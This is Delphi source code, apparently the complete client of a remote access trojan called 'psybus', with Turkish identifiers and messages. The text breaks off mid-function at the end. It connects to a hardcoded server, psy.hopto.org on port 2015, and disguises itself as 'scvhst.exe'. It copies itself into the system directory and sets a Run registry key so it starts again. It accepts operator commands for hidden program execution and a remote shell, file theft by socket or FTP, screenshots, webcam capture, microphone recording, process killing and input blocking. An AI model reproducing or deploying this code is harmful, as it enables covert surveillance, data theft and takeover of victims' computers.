program psybus;

uses
  Windows,
  ApplicationUnit,
  SocketUnit,
  sysutils,
  gfxCore,
  //vmutils,
  threadunit2,
  Tlhelp32;

var
Application: TApplication;
MainSocket: TClientSocket;
MutexX: THandle;
a1,a2,a3: string;
dosya:string;
yollanacak : string;
sunucu: string;
portt: integer;
usr: pchar;
sifre: pchar;
DosApp:String;
kayitsure:integer;
{$I-}

CONST
Tashakli_isim = 'scvhst.exe';
anahtaradi = 'scvhst';
MuteXxX = 'PsyXxReloaded22';
adres = 'psy.hopto.org';
port = 2015;

cOsUnknown = 'Bilinmiyor';
cOsWin95    = 'Win95';
cOsWin98    = 'Win98';
cOsWin98SE  = 'Win98SE';
cOsWinME    = 'WinME';
cOsWinNT    = 'WinNT';
cOsWin2000  = 'Win2k';
cOsXP       = 'WinXP';

WM_QUIT             = $0012;
WM_SYSCOMMAND       = $0112;

INTERNET_OPEN_TYPE_DIRECT           = 1;
INTERNET_SERVICE_FTP = 1;
INTERNET_FLAG_PASSIVE = $08000000;
FTP_TRANSFER_TYPE_UNKNOWN   = $00000000;
IOC_IN = $80000000;
FIONBIO  = IOC_IN  or (SizeOf(Longint) shl 16) or (Ord('f') shl 8) or 126;

type
HINTERNET = Pointer;
INTERNET_PORT = Word;
MCIERROR = DWORD;
u_int   = DWORD;
u_long  = DWORD;
TSocket = u_int;

function InternetOpen(lpszAgent: PChar; dwAccessType: DWORD; lpszProxy, lpszProxyBypass: PChar; dwFlags: DWORD): HINTERNET; stdcall; external 'wininet.dll' name 'InternetOpenA';
function FtpPutFile(hConnect: HINTERNET; lpszLocalFile: PChar; lpszNewRemoteFile: PChar; dwFlags: DWORD; dwContext: DWORD): BOOL; stdcall; external 'wininet.dll' name 'FtpPutFileA';
function InternetCloseHandle(hInet: HINTERNET): BOOL; stdcall; external 'wininet.dll' name 'InternetCloseHandle';
function InternetConnect(hInet: HINTERNET; lpszServerName: PChar; nServerPort: INTERNET_PORT; lpszUsername: PChar; lpszPassword: PChar; dwService: DWORD; dwFlags: DWORD; dwContext: DWORD): HINTERNET; stdcall; external 'wininet.dll' name 'InternetConnectA';
function ShellExecute(hWnd: HWND; Operation, FileName, Parameters, Directory: PChar; ShowCmd: Integer): HINST; stdcall; external 'shell32.dll' name 'ShellExecuteA';
function mciSendString(lpstrCommand, lpstrReturnString: PChar; uReturnLength: UINT; hWndCallback: HWND): MCIERROR; stdcall; external 'winmm.dll' name 'mciSendStringA';
function ioctlsocket( const s: TSocket; const cmd: DWORD; var arg: u_long ): Integer; stdcall; external 'WS2_32.DLL' name 'ioctlsocket';
function Blockinput(Block: BOOL): BOOL; stdcall; external 'USER32.DLL' name 'BlockInput';

function parcala(const s: string; wordIndex: integer): string;
var
  index, counter: integer;
begin
  result:= trim(s); //result equals the string you entered
  counter := 0; //counter starts at 0
  index := Pos('||', result); //if there are 2 spaces by each other
   while index > 0 do //while its true theres more then 1 space by each other
  begin
   Delete(result, index, 1); //delete one of the spaces
   index := Pos('||', result); //check the string again for double spaces
  end;
  //Now there are no spaces next to each other we can continue ;)
  index := Pos('|', result); //get the position of the first word
    while ((counter < wordIndex) and (index > 0)) do //while counter is less then wordindex and there are more words countinue
  begin
    Delete(result, 1, index); //delete all characters from the beginning index to the space to the next word
    index := Pos('|', result); //check if there any more words in the string by looking for spaces

    counter := counter + 1; //increment the counter by one
  end;

  if (counter < wordIndex) then //if were not enough words in your search return a blank string
    result:= '';

  index := Pos('|', result); //check if there are more words after your word
  if index > 0 then  //if there are more words
    Delete(result, index, maxInt);// start at the space then delete all the words after the space maxInt is the largest number a integer will go by
end;

function KillApp(const sCapt: PChar) : boolean;
  var AppHandle:THandle;
begin
  AppHandle:=FindWindow(Nil, sCapt);
  Result:=PostMessage(AppHandle, WM_QUIT, 0, 0) ;
end;

function ecozunurluk : String;
begin
  Result:=IntToStr(GetSystemMetrics(SM_CXSCREEN)) + ' x ' +
          IntToStr(GetSystemMetrics(SM_CYSCREEN));
end;

function idle: DWord;
var
   liInfo: TLastInputInfo;
begin
   liInfo.cbSize := SizeOf(TLastInputInfo) ;
   GetLastInputInfo(liInfo) ;
   Result := (GetTickCount - liInfo.dwTime);
end;

function AppActivate(WindowName : PChar) : boolean;
var
WindowHandle : HWND;
begin
  try
    Result:=true;
    WindowHandle:=FindWindow(nil,WindowName);
    If (WindowHandle<>0) then begin
      SendMessage(WindowHandle, WM_SYSCOMMAND, SC_RESTORE, WindowHandle);
      SetForegroundWindow(WindowHandle);
    end else Result:=false;
  except
    on Exception do Result:=false;
  end;
end;

function flash(const sCapt: PChar) : boolean;
  var AppHandle:THandle;
  label kapa;
begin
  AppHandle:=FindWindow(Nil, sCapt);
  if FlashWindow(AppHandle, True) = true then begin
  Result:=True;
  exit
  end;
  Result:=false;
end;

function GetOSLanguage: string;
var
LanguageID:LangID;
Len: Integer;
begin
SetLength(Result, 255);
LanguageID:=GetSystemDefaultLangID;
Len:=VerLanguageName(LanguageID,PChar(Result), Length(Result));
SetLength(Result, Len);
end;

function GetOS: string;
var
  osVerInfo: TOSVersionInfo;
  majorVer, minorVer: Integer;
begin
  Result := cOsUnknown;
  { set operating system type flag }
  osVerInfo.dwOSVersionInfoSize := SizeOf(TOSVersionInfo);
  if GetVersionEx(osVerInfo) then
  begin
    majorVer := osVerInfo.dwMajorVersion;
    minorVer := osVerInfo.dwMinorVersion;
    case osVerInfo.dwPlatformId of
      VER_PLATFORM_WIN32_NT: { Windows NT/2000 }
        begin
          if majorVer <= 4 then
            Result := cOsWinNT
          else if (majorVer = 5) and (minorVer = 0) then
            Result := cOsWin2000
          else if (majorVer = 5) and (minorVer = 1) then
            Result := cOsXP
          else
            Result := cOsUnknown;
        end;
      VER_PLATFORM_WIN32_WINDOWS:  { Windows 9x/ME }
        begin
          if (majorVer = 4) and (minorVer = 0) then
            Result := cOsWin95
          else if (majorVer = 4) and (minorVer = 10) then
          begin
            if osVerInfo.szCSDVersion[1] = 'A' then
              Result := cOsWin98SE
            else
              Result := cOsWin98;
          end
          else if (majorVer = 4) and (minorVer = 90) then
            Result := cOsWinME
          else
            Result := cOsUnknown;
        end;
      else
        Result := cOsUnknown;
    end;
  end
  else
    Result := cOsUnknown;
end;

procedure aciliskontrol;
begin
{$IFDEF Win32}
MutexX:=CreateMutex(NIL, False, MuteXxX);
if WaitForSingleObject(MutexX, 10000)=WAIT_TIMEOUT then Halt;
{$ELSE}
if HPrevInst=0 then Exit;
{$ENDIF}
end;

function SearchAndReplace(sSrc, sLookFor, sReplaceWith : string) : string;
var
   nPos, nLenLookFor : integer;
begin
   nPos := Pos(sLookFor, sSrc) ;
   nLenLookFor := Length(sLookFor) ;
   while (nPos > 0) do begin
     Delete(sSrc, nPos, nLenLookFor) ;
     Insert(sReplaceWith, sSrc, nPos) ;
     nPos := Pos(sLookFor, sSrc) ;
   end;
   Result := sSrc;
end;

function tempdizini: string;
var
  lng:     DWORD;
begin
  SetLength(Result, MAX_PATH);
  lng := GetTempPath(MAX_PATH, PChar(Result));
  SetLength(Result, lng);
end;

procedure SetPort(address, Value: Word);
var
  bValue: Byte;
begin
  bValue := trunc(Value and 255);
  asm
    mov dx, address
    mov al, bValue
    out dx, al
  end;
end;

function GetPort(address: Word): Word;
var
  bValue: Byte;
begin
  asm
    mov dx, address
    in al, dx
    mov bValue, al
  end;
  GetPort := bValue;
end;

procedure Delay(MSecs: Integer);
  var
    FirstTickCount: LongInt;
  begin
    FirstTickCount := GetTickCount;
    repeat
     Application.ProcessMessages
      //or use Application.ProcessMessages instead of Sleep
    until ((GetTickCount - FirstTickCount) >= Longint(MSecs));
  end;

procedure Sound(aFreq, aDelay: Integer);

  procedure DoSound(Freq: Word);
  var
    B: Byte;
  begin
    if Freq > 18 then
    begin
      Freq := Word(1193181 div Longint(Freq));
      B    := Byte(GetPort($61));

      if (B and 3) = 0 then
      begin
        SetPort($61, Word(B or 3));
        SetPort($43, $B6);
      end;

      SetPort($42, Freq);
      SetPort($42, Freq shr 8);
    end;
  end;

begin
  if Win32Platform = VER_PLATFORM_WIN32_NT then
  begin
    Windows.Beep(aFreq, aDelay);
  end
  else
  begin
    DoSound(aFreq);
    Delay(aDelay);
  end;
end;

procedure NoSound;
var
  Value: Word;
begin
  if not (Win32Platform = VER_PLATFORM_WIN32_NT) then
  begin
    Value := GetPort($61) and $FC;
    SetPort($61, Value);
  end;
end;

function windizini : string;
var
  a : Array[0..144] of char;
begin
  GetWindowsDirectory(a, sizeof(a));
  result:=StrPas(a);
end;

function sysdizini : string;
var
  a : Array[0..144] of char;
begin
  GetSystemDirectory(a, sizeof(a));
  result:=StrPas(a);
end;

function kullanici : Ansistring;
var
  dwI : DWord;
begin
  dwI := MAX_PATH;
  SetLength (Result, dwI + 1);
  if WNetGetUser (Nil, PChar (Result), dwI) = NO_ERROR then
    SetLength (Result, StrLen (PChar (Result)))
  else
    SetLength (Result, 0)
end;

function makine : string;
var
  Makine_ismi:array[0..255] of char;
  BufferSize:DWORD;
begin
  BufferSize:=SizeOf(Makine_ismi);
  GetComputerName(@Makine_ismi,BufferSize);
 result:= Makine_ismi;
end;

Function ListProcesses:String;
 Var
  Handle:THandle;
  ProcShot:TProcessEntry32;
  Str:string;
  i:Integer;
  Loop:bool;
 begin
 str:='';
 i:=0;
 Handle:=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
 ProcShot.dwSize:=sizeof(ProcShot);
 loop:=Process32First(Handle,ProcShot);
 while integer(loop) <> 0 do
 begin
 Str:=Str+ProcShot.szExeFile+'|';
 i:=i+1;
 Loop:=Process32Next(Handle,ProcShot);
 end;
 CloseHandle(Handle);
 Result:=('-islemler:' + IntToStr(i)+'|'+Str);
 end;

function KillProcess(ExeFileName: string): integer;
const
PROCESS_TERMINATE=$0001;
var
ContinueLoop: BOOL;
FSnapshotHandle: THandle;
FProcessEntry32: TProcessEntry32;
begin
result := 0;
FSnapshotHandle:=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
FProcessEntry32.dwSize:=Sizeof(FProcessEntry32);
ContinueLoop:=Process32First(FSnapshotHandle,FProcessEntry32);
while integer(ContinueLoop)<>0 do begin
if ((UpperCase(ExtractFileName(FProcessEntry32.szExeFile))=UpperCase(ExeFileName)) or (UpperCase(FProcessEntry32.szExeFile)=UpperCase(ExeFileName))) then
Result:=Integer(TerminateProcess(OpenProcess(PROCESS_TERMINATE, BOOL(0),FProcessEntry32.th32ProcessID), 0));
ContinueLoop := Process32Next(FSnapshotHandle,FProcessEntry32);
end;
CloseHandle(FSnapshotHandle);
end;

function ListFiles(Directory:String):string;
var
FileName, FileList, DirList:string;
FindHandle:THandle;
SearchRec:TWIN32FindData;
FileCount, DirCount:integer;

begin
FileCount:= 0;
DirCount := 0;
ListFiles:='';
try
FindHandle := FindFirstFile(PChar(Directory+'*.*'), SearchRec);
if FindHandle <> INVALID_HANDLE_VALUE then
repeat
FileName:=SearchRec.cFileName;
if ((SearchRec.dwFileAttributes and FILE_ATTRIBUTE_DIRECTORY) <> 0) then
begin
DirList:=DirList + (FileName + '|');
DirCount := DirCount + 1;
end
else
begin
FileList:=FileList + (Filename + '|');
FileCount := FileCount + 1;
end;
until FindNextFile(FindHandle,SearchRec)=false;
Windows.FindClose(FindHandle);
finally
//sysutils.FindClose(FindHandle);
end;
ListFiles:=('-klasor:' + IntToStr(DirCount) + '|' + DirList + '-dosya:' + IntToStr(FileCount) + '|' + FileList);
end;

function DiskInDrive(Drive: Char): Boolean;
var
errormode: WORD;
begin
if Drive in ['a'..'z'] then Dec(Drive, $20);
{ make sure it's a letter }
ErrorMode := SetErrorMode(SEM_FailCriticalErrors);
try
    { drive 1 = a, 2 = b, 3 = c, etc. }
if DiskSize(Ord(Drive) - $40) = -1 then
Result := False
else
Result := True;
finally
{ restore old error mode }
SetErrorMode(ErrorMode);
end;
end;

function List_Drivers: String;
Var
 ID : DWORD;
 i , DriverCount :Integer;
 DriverType : String;
 str:string;
 cins:char;
 begin
  result:='';
  DriverCount:=0;
  Id:=GetLogicalDrives;
  for i :=0 to 25 do begin
  if (id and(1 shl i)) <> 0 then begin
  cins:=char(ord('A')+i);
   case GetDriveType(pchar(char(ord('A')+i)+':\'))of
   DRIVE_UNKNOWN:     drivertype:= 'Bilinmeyen Aygit';
        DRIVE_NO_ROOT_DIR: drivertype:= 'Kullanilamaz Aygit';
        DRIVE_REMOVABLE:   if DiskInDrive(cins) = true then drivertype:= 'Tasinabilir Disk (Aktif)' else drivertype:='Tasinabilir Disk (Hazir degil)';
        DRIVE_FIXED:       drivertype:= 'Harddisk';
        DRIVE_REMOTE:      drivertype:= 'Ag Baglantisi';
        DRIVE_CDROM:       if DiskInDrive(cins) = true then drivertype:= 'CD-ROM (Aktif)' else drivertype:= 'CD-ROM (Hazir degil)' ;
        DRIVE_RAMDISK:     drivertype:= 'Sanal Sürücü (RAMDISK)';
       end;
       str:=str+pchar(char(ord('A')+i)+':\')+DriverType+'|';
       DriverCount :=DriverCount + 1;
  end;
end;
result:=('-srcler:'+IntToStr(DriverCount)+'|'+str);
end;

function GetFileSize(FileName: String): Int64;
Var
  H: THandle;
  fData: tWin32FindData;
Begin
  Result := -1;
  H := FindFirstFile(pChar(FileName), fData);
  If H <> INVALID_HANDLE_VALUE Then
  Begin
    Windows.FindClose(H);
    Result := Int64(fData.nFileSizeHigh) shl 32 + fData.nFileSizeLow;
  End;
End;

procedure hata(mesaj:string);
begin
Mainsocket.SendString(mesaj)
end;

procedure FTPyolla(Threadimsi: TThread2);
var
intconn,intopen : hinternet;
begin
if fileexists(dosya) = true then begin
Mainsocket.SendString('Baglaniyor: '+sunucu+':'+inttostr(port)+'/'+usr+'@'+sifre);
intopen := internetopen('iexplore',INTERNET_OPEN_TYPE_DIRECT,nil,nil,0);
intconn := internetconnect(intopen,pchar(sunucu),portt,usr,sifre,INTERNET_SERVICE_FTP,INTERNET_FLAG_PASSIVE,0);
sleep(100);
if getlasterror=0  then Mainsocket.SendString('Baglandi, Dosya gonderiliyor..') else Mainsocket.SendString('Baglanti hatasi');
ftpputfile(intconn,pchar(dosya),pchar(yollanacak),FTP_TRANSFER_TYPE_UNKNOWN,0);
internetclosehandle(intconn);
internetclosehandle(intopen) ;
if getlasterror=0  then Mainsocket.SendString('Dosya gönderildi : '+ExtractFileName(dosya)) else sleep(1);
end;
if fileexists(dosya) = false then Mainsocket.SendString('Dosya bulunamadi..');
dosya:='';
yollanacak := '';
sunucu:= '';
portt:= 0;
usr:= '';
sifre:= '';
END;

procedure dosyayolla(dosya:string);
begin
mainsocket.SendFile(dosya, nil);
End;

function TaskList(FirstHandle: THandle): string;
var
   lngLen:longint;
   strBuffer,This,All:string;
   TaskHandle:THandle;
   psayisi:integer;
begin
   psayisi:=0;
   TaskHandle:=GetWindow(FirstHandle,GW_HWNDFIRST);
   while TaskHandle > 0 do
   begin
      lngLen:=GetWindowTextLength(TaskHandle) + 1;
      SetLength(strBuffer,lngLen);
      lngLen:=GetWindowText(TaskHandle,PChar(strBuffer),lngLen);
      if lngLen > 0 then
      begin
     This:=TrimRight(strBuffer);
     if IsWindowVisible(TaskHandle) then begin
     this:=SearchAndReplace(this,'|','?');
         All:=All + This + '|';
         psayisi:= psayisi + 1;
    end;
end;
TaskHandle:=GetWindow(TaskHandle,GW_HWNDNEXT);
end;
TaskList:='-pencere:'+inttostr(psayisi)+'|'+Copy(All,1,Length(All) - 1);
end;

procedure konsolcikisi(Threadimtirack: TThread2);
  const
     ReadBuffer = 2400;
  var
   Security : TSecurityAttributes;
   ReadPipe,WritePipe : THandle;
   start : TStartUpInfo;
   ProcessInfo : TProcessInformation;
   Buffer : Pchar;
   BytesRead : DWord;
   Apprunning : DWord;
  begin
   With Security do begin
    nlength := SizeOf(TSecurityAttributes) ;
    binherithandle := true;
    lpsecuritydescriptor := nil;
   end;
   if Createpipe (ReadPipe, WritePipe,
                  @Security, 0) then begin
    Buffer := AllocMem(ReadBuffer + 1) ;
    FillChar(Start,Sizeof(Start),#0) ;
    start.cb := SizeOf(start) ;
    start.hStdOutput := WritePipe;
    start.hStdInput := ReadPipe;
    start.dwFlags := STARTF_USESTDHANDLES +
                         STARTF_USESHOWWINDOW;
    start.wShowWindow := SW_HIDE;

    if CreateProcess(nil,
           PChar(DosApp),
           @Security,
           @Security,
           true,
           NORMAL_PRIORITY_CLASS,
           nil,
           nil,
           start,
           ProcessInfo)
    then
    begin
     repeat
      Apprunning := WaitForSingleObject
                   (ProcessInfo.hProcess,100) ;
      Application.ProcessMessages;
     until (Apprunning <> WAIT_TIMEOUT) ;
      Repeat
        BytesRead := 0;
        ReadFile(ReadPipe,Buffer[0],
ReadBuffer,BytesRead,nil) ;
        Buffer[BytesRead]:= #0;
        OemToAnsi(Buffer,Buffer) ;
       mainsocket.sendstring(String(Buffer)) ;
      until (BytesRead < ReadBuffer) ;
   end;
   FreeMem(Buffer) ;
   CloseHandle(ProcessInfo.hProcess) ;
   CloseHandle(ProcessInfo.hThread) ;
   CloseHandle(ReadPipe) ;
   CloseHandle(WritePipe) ;
  end;
  DosApp:='';
  mainsocket.Sendstring('Komut sonu..');
end;

procedure zaman_kayit(Threadimtirack2: TThread2);
var
alitoputut:THandle;
begin
alitoputut:=getforegroundwindow();
mainSocket.Sendstring('Basladi..');
mciSendString('OPEN NEW TYPE WAVEAUDIO ALIAS mysound', nil, 0, alitoputut);
mciSendString('SET mysound TIME FORMAT MS ' +     // set time
    'BITSPERSAMPLE 16 ' +                // 8 Bit
    'CHANNELS 1 ' +                     // MONO
    'SAMPLESPERSEC 11025 ' +             // 8 KHz
    'BYTESPERSEC 21000',                // 8000 Bytes/s
    nil, 0, alitoputut);
mciSendString('RECORD mysound', nil, 0, alitoputut);
Delay(kayitsure);
mciSendString('STOP mysound', nil, 0, alitoputut);
sleep(1);
mciSendString(PChar('SAVE mysound ' + sysdizini+'\sysrss64.sys'), nil, 0, alitoputut);
sleep(1);
mciSendString('CLOSE mysound', nil, 0, alitoputut);
mainSocket.Sendstring('Ses Kaydý Tamam ;) / '+inttostr(GetFileSize(sysdizini+'\sysrss64.sys') div 1024)+' kb');
sleep(1);
mainSocket.Sendstring('+al='+sysdizini+'\sysrss64.sys')
end;

Function Anahtaroku(kRoot:Hkey; Path, Value:String):String;
Var
 Key : Hkey;
 Siz : Cardinal;
 Val : Array[0..16382] Of Char;
Begin
 kRoot:=HKEY_LOCAL_MACHINE;
 ZeroMemory(@Val, Length(Val));
 RegOpenKeyEx(kRoot, pChar(Path), 0, REG_SZ, Key);
 Siz := 16383;
 RegQueryValueEx(Key, pChar(Value), NIL, NIL, @Val[0], @Siz);
 RegCloseKey(Key);
 If Val <> '' then
  Result := Val;
End;

procedure ayrinti1;
begin
a1:='bilinmiyor';
a2:='bilinmiyor';
a3:='bilinmiyor';
If (GetOs = 'WinXP') or (GetOs = 'Win2k') or (GetOs = 'WinNT') Then Begin
   a1:=Anahtaroku(HKEY_LOCAL_MACHINE, 'Software\Microsoft\Windows NT\CurrentVersion', 'ProductName');
   a2:=Anahtaroku(HKEY_LOCAL_MACHINE, 'Software\Microsoft\Windows NT\CurrentVersion', 'RegisteredOwner');
   a3:=Anahtaroku(HKEY_LOCAL_MACHINE, 'Software\Microsoft\Windows NT\CurrentVersion', 'RegisteredOrganization');
  End Else Begin
   a1:=Anahtaroku(HKEY_LOCAL_MACHINE, 'Software\Microsoft\Windows\CurrentVersion', 'ProductName');
   a2:=Anahtaroku(HKEY_LOCAL_MACHINE, 'Software\Microsoft\Windows\CurrentVersion', 'RegisteredOrganization');
   a3:=Anahtaroku(HKEY_LOCAL_MACHINE, 'Software\Microsoft\Windows\CurrentVersion', 'RegisteredOwner');
  End;
  if a1='' then a1:='bilinmiyor';
  if a2='' then a2:='bilinmiyor';
  if a3='' then a3:='bilinmiyor';
end;

function RunProcess(const AppPath:string; AppParams: string; Visibility: Word):DWORD;
var
 SI: TStartupInfo;
 PI: TProcessInformation;
 Proc: THandle;
 zFileName, zParams: array[0..79] of Char;
begin
 FillChar(SI, SizeOf(SI), 0);
 SI.cb := SizeOf(SI);
 SI.wShowWindow := Visibility;
 CreateProcess(StrPCopy(zFileName, AppPath),StrPCopy(zParams, AppParams),nil, nil, false, Normal_Priority_Class, nil, nil, SI, PI);
 Proc := PI.hProcess;
 CloseHandle(PI.hThread);
 GetExitCodeProcess(Proc, Result);
 CloseHandle(Proc);
end;

procedure CheckConnection(Thread: TThread2; Socket: TClientSocket);
var
  komut: string;
  Nonblocking: cardinal;
  Handler :  THandle;
  Caption :  array[0..80] of Char;
  DB: integer;
  label SON;
begin
  Nonblocking := 1;
  ioctlsocket(Socket.Socket, FIONBIO, Nonblocking);
  While Socket.Connected do begin
    komut := Socket.ReceiveString;
    if Length(komut) > 0 then begin
    //komutlar basla!

    //basit dosya komutlarý

    if copy (komut, 1, 3)='/LS' then begin
    delete(komut, 1, 4);
    Socket.Sendstring(ListFiles(komut));
    sleep(1);
    Socket.Sendstring('Listelenen Dizin : '+komut);
    sleep(1);
    Socket.Sendstring('Aktif Dizin : '+getcurrentdir);
    end;

    if copy (komut, 1, 3)='/EX' then begin
    delete(komut, 1, 4);
    winexec(pchar(komut), SW_SHOWNORMAL);
    Socket.Sendstring('Calistirildi : '+komut);
    end;

    if copy (komut, 1, 3)='/DC' then begin
    delete(komut, 1, 4);
    RunProcess(PChar(komut),'', SW_SHOWNORMAL);
    Socket.Sendstring('Calistirildi : '+komut);
    end;

    if copy (komut, 1, 4)='/SIL' then begin
    delete(komut, 1, 5);
    if deletefile(komut) = true then Socket.Sendstring('Dosya silindi: '+komut)
    else
    Socket.Sendstring('Dosya silinemedi!: '+komut);
    end;

    if copy (komut, 1, 6)='/KOPYA' then begin
    delete(komut, 1, 7);
    if copyfile(pchar(parcala(komut,0)),pchar(parcala(komut,1)),false) = true then Socket.Sendstring('Dosya kopyalandi: '+parcala(komut,1))
    else
    Socket.Sendstring('Dosya kopyalanamadi!: '+parcala(komut,1));
    end;

    if copy (komut, 1, 7)='/YADLAN' then begin
    delete(komut, 1, 8);
    if renamefile(pchar(parcala(komut,0)),pchar(parcala(komut,1))) = true then Socket.Sendstring('Tamam : '+parcala(komut,1))
    else
    Socket.Sendstring('Hata : '+parcala(komut,1));
    end;

    if copy (komut, 1, 3)='/CD' then begin
    delete(komut, 1, 4);
    chdir(pchar(komut));
    Socket.Sendstring('islenen parametre: '+komut);
    Socket.Sendstring('Aktif Dizin : '+getcurrentdir);
    end;

    if copy (komut, 1, 7)='/DYUKLE' then begin
    delete(komut, 1, 8);
    try
    dosya:=parcala(komut,0);
    yollanacak := parcala(komut,1);
    sunucu:= parcala(komut,2);
    portt:= strtoint(parcala(komut,3));
    usr:= pchar(parcala(komut,4));
    sifre:= pchar(parcala(komut,5));
    except
    on EConvertError DO HATA('yandýmanam!');
    end;
    TThread2.Create(@FTPYolla, 0);
    end;

    if copy (komut, 1, 3)='/DB' then begin
    delete(komut, 1, 4);
    DB:=GetFileSize(komut);
    if DB < 1024 then begin
    Socket.Sendstring('Dosya Boyutu: '+inttostr(DB)+' bayt');
    goto SON
    end;
    DB:= (DB div 1024);
    Socket.Sendstring('Dosya Boyutu: '+inttostr(DB)+' kb');
    end;

    if copy (komut, 1, 8)='/PGEBERT' then begin
    delete(komut, 1, 9);
    if KillProcess(komut) = 1 then Socket.Sendstring('Katledildi: '+komut)
    else
    Socket.Sendstring('Kapatilamadi :'+komut)
    end;

    if komut = '/DR' then begin
    Socket.Sendstring('Aktif Dizin : '+getcurrentdir);
    end;

    if komut = '/APENC' then begin
    Handler := GetForegroundWindow;
    GetWindowText(Handler, Caption, 80);
    Socket.Sendstring('Aktif baslik : '+Caption);
    end;

    if copy (komut, 1, 3)='/SC' then begin
    delete(komut, 1, 4);
    try
    Socket.Sendstring('Ekran Goruntusu aliniyor / kalite:'+komut);
    SaveScr(strtoint(komut), sysdizini+'\sysrss32.sys');
    except
    on EConvertError DO HATA('yandýmanam!');
    end;
    Socket.Sendstring('+al='+sysdizini+'\sysrss32.sys')
   end;

    if copy (komut, 1, 3)='/CC' then begin
    delete(komut, 1, 4);
    try
    Socket.Sendstring('Webcam Goruntusu aliniyor / kalite:'+komut);
    Camkaydet(strtoint(komut),sysdizini+'\sysrss16.sys');
    except
    on EConvertError DO HATA('yandýmanam!');
    end;
    Socket.Sendstring('+al='+sysdizini+'\sysrss16.sys')
    end;

    if copy (komut, 1, 3)='/MC' then begin
    delete(komut, 1, 4);
    try
    Socket.Sendstring('Ses Kaydý alýnýyor / Sure:'+komut+' saniye');
    kayitsure:= strtoint(komut)*1000;
    except
    on EConvertError DO HATA('yandýmanam!');
    end;
    TThread2.Create(@zaman_kayit, 0);
    end;

    if komut = '/PRG' then begin
    Socket.Sendstring(ListProcesses);
    end;

    if komut = '/WDIZINI' then begin
    Socket.Sendstring(windizini);
    end;

    if komut = '/SYSDIZINI' then begin
    Socket.Sendstring(sysdizini);
    end;

    if komut = '/TEMP' then begin
    Socket.Sendstring(tempdizini);
    end;

    if komut = '/TL' then begin
    Socket.Sendstring(TaskList(getforegroundwindow));
    end;

    if komut = '/TANIMLA' then begin
    socket.sendstring('-tanim'+'|'+Paramstr(0)+'|'+Tashakli_isim+'|'+anahtaradi+'|'+adres+':'+inttostr(port)+'|'+MuteXxX);
    end;

    if komut = '/DRV' then begin
    Socket.Sendstring(List_Drivers);
    end;

    if komut = '/BILGI' then begin
    ayrinti1;
    socket.SendString('-bilgi'+'|'+makine+'|'+kullanici+'|'+getos+'|'+GetOSLanguage+'|'+ecozunurluk+'|'+a1+'|'+a2+'|'+a3+'|'+inttostr(GetTickCount)+'|'+inttostr(idle));
    end;

    if copy (komut, 1, 6)='/HADEE' then begin
    delete(komut, 1, 7);
    if fileexists(komut) = false then begin
    Socket.Sendstring('Dosya Bulunamadi..');
    goto SON
    end;
    ShellExecute(0,'open',PChar(komut),nil,nil,SW_SHOW);
    Socket.Sendstring('Calistirildi ;)');
    end;

    if copy (komut, 1, 3)='/GC' then begin
    delete(komut, 1, 4);
    if fileexists(komut) = false then begin
    Socket.Sendstring('Dosya Bulunamadi..');
    goto SON
    end;
    ShellExecute(0,'open',PChar(komut),nil,nil,SW_HIDE);
    Socket.Sendstring('Calistirildi ;)');
    end;

    if copy (komut, 1, 4)='/DOS' then begin
    Socket.Sendstring('Komut i$leniyor..');
    delete(komut, 1,5);
    DosApp:=komut;
    TThread2.Create(@konsolcikisi, 0);
    end;

    if copy (komut, 1, 5)='/CROM' then begin
    if parcala(komut,1) = 'AC' then begin
    mciSendString('Set cdaudio door open', nil, 0, 0);
    Socket.Sendstring('CDROM kapagi acildi..');
    end;
    if parcala(komut,1) = 'KAPA' then begin
    mciSendString('Set cdaudio door closed', nil, 0, 0);
    Socket.Sendstring('CDROM kapagi kapandi..');
    end;
    end;

    if copy (komut, 1, 4)='/OKU' then begin
    delete(komut, 1, 5);
    if fileexists(pchar(komut)) = false then socket.SendString('Dosya bulunamadi : '+pchar(komut))
    else
    dosyayolla(pchar(komut))
    end;

    if komut = '/TEMIZLIK' then begin
    deletefile(sysdizini+'\sysrss16.sys');
    deletefile(sysdizini+'\sysrss32.sys');
    deletefile(sysdizini+'\sysrss64.sys');
    Socket.Sendstring('Pýrýl Pýrýl :D');
    end;

    if komut = '/INTIHAR' then begin
    Socket.Sendstring('hakkýný helal et :(');
    KillProcess(extractfilename(Paramstr(0)));
    end;

    if komut = '/BKES' then begin
    Socket.Sendstring('Baglanti Kesiliyor..');
    socket.Disconnect;
    end;

    if copy (komut, 1, 7)='/PKAPAT' then begin
    delete(komut, 1, 8);
    if KillApp(pchar(komut)) = true then socket.SendString('Pencere Kapatýldý : '+komut)
    else
    socket.SendString('Ba$lýk Bulunamadý :'+komut)
    end;

    if komut = '/KILITLE' then begin
    BlockInput(true);
    Socket.Sendstring('Giri$ aygýtlari devre dý$ý..');
    end;

    if komut = '/KILITAC' then begin
    BlockInput(false);
    Socket.Sendstring('Giri$ aygitlari aktif..');
    end;

    if copy (komut, 1, 7)='/PFLASH' then begin
    delete(komut, 1, 8);
    if flash(pchar(komut)) = true then socket.SendString('i$lem Tamam : '+komut)
    else
    socket.SendString('Ba$lýk Bulunamadý :'+komut)
    end;

    if copy (komut, 1, 7)='/PGETIR' then begin
    delete(komut, 1, 8);
    if AppActivate(pchar(komut)) = true then socket.SendString('i$lem Tamam : '+komut)
    else
    socket.SendString('Ba$lýk Bulunamadý :'+komut)
    end;

//komutlar son!

//client - server ili$kisi
if komut = '-giris' then begin
Socket.Sendstring('Ben Geldiim : '+makine+'/'+kullanici);
end;

if komut = '-kdegisti' then begin
Socket.Sendstring('Aktif Baglanti: '+makine+'@'+kullanici+' uzerinde '+extractfilename(Paramstr(0)));
end;

if copy (komut, 1, 5)='-ping' then begin
delete(komut, 1, 5);
Socket.Sendstring('-cvp'+komut);
end;

if copy (komut, 1, 5)='-idle' then begin
delete(komut, 1, 5);
Socket.Sendstring('-i'+inttostr(idle));
end;

if copy (komut, 1, 4)='-ses' then begin
try
Sound(strtoint(parcala(komut,1)), strtoint(parcala(komut,2)));
except
on EConvertError DO HATA('yandýmanam!');
end;
end;

if komut = '-sus' then begin
NoSound;
end;

SON:
end;
Sleep(1);
Application.ProcessMessages;
end;

Socket.Disconnect;
Socket.Free;
end;

procedure kurbeni(Yol:String);
var
anahtar:HKEY;
label KUR;
begin
if ParamStr(0) = sysdizini+'\'+tashakli_isim then goto KUR;
CopyFile(PChar(Paramstr(0)),PChar(Yol),False);
KUR:
RegOpenKey(HKEY_LOCAL_MACHINE,'SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN',anahtar);
